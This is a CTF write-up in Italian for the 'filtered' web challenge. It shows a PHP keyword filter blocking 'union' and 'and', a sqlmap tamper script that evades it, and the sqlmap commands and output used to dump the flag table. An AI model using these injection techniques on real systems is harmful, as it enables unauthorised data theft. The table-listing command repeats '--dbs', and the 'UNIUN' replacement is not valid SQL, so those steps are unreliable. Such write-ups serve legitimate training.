# Writeup: WS_2.02 - filtered

**Descrizione**  
È presente un endpoint vulnerabile a SQL Injection:  
```
http://filtered.challs.cyberchallenge.it/post.php?id=
```
Tuttavia, nel codice PHP compare una funzione che filtra alcune keyword (`union`, `and`) sostituendole o impedendone l’uso:
```php
function is_hackerz($input) {
    foreach (['union', 'and'] as $keyword) {
        if (stripos($input, $keyword) !== false) {
            return true;
        }
    }
    return false;
}
```
L’obiettivo è aggirare questo filtro e ottenere la flag memorizzata nel database.

---

## Bypass del Filtro
Per bypassare il filtro su `union` e `and`, possiamo utilizzare un **tamper script** di SQLMap che sostituisce le keyword bloccate con varianti non riconosciute. Ad esempio:

```python
# replace.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = payload.replace("AND", "&&")      # Sostituisce 'AND' con '&&'
    payload = payload.replace("UNION", "UNIUN") # Se necessario, si può usare altra forma
    return payload
```

---

## Utilizzo di SQLMap
1. **Individuazione dei Database**  
   ```bash
   sqlmap -u "http://filtered.challs.cyberchallenge.it/post.php?id=1" \
     --tamper=replace \
     --technique=B \
     --level=5 \
     --risk=3 \
     --batch \
     --dbs
   ```
   Dal risultato emergono i database:  
   - `filtered`  
   - `information_schema`  
   - `performance_schema`

2. **Ricerca Tabelle nel Database `filtered`**  
   ```bash
   sqlmap -u "http://filtered.challs.cyberchallenge.it/post.php?id=1" \
     --tamper=replace \
     --technique=B \
     --level=5 \
     --risk=3 \
     --batch \
     --dbs
   ```
   Scopriamo le tabelle:  
   - `flaggy`  
   - `posts`

3. **Esplorazione Tabella `flaggy`**  
   ```bash
   sqlmap -u "http://filtered.challs.cyberchallenge.it/post.php?id=1" \
     --tamper=replace \
     --technique=B \
     --level=5 \
     --risk=3 \
     --batch \
     -D filtered \
     -T flaggy \
     --columns
   ```
   Risultano le colonne:  
   - `now (text)`  
   - `play (varchar(255))`

4. **Dump dei Dati**  
   ```bash
   sqlmap -u "http://filtered.challs.cyberchallenge.it/post.php?id=1" \
     --tamper=replace \
     --technique=B \
     --level=5 \
     --risk=3 \
     --batch \
     -D filtered \
     -T flaggy \
     --dump
   ```
   Dal dump otteniamo:
   ```
   +------------------------------------------------------------------------------------------------+--------+
   | now                                                                                            | play   |
   +------------------------------------------------------------------------------------------------+--------+
   | This time your secret is CCIT{Bl4ckl1sts_Ar3_s0_c00l}, in the middle of a sentence. We'll see. | r4ndom |
   | me pls                                                                                         | fix    |
   +------------------------------------------------------------------------------------------------+--------+
   ```

---

## Flag
```
CCIT{Bl4ckl1sts_Ar3_s0_c00l}
```
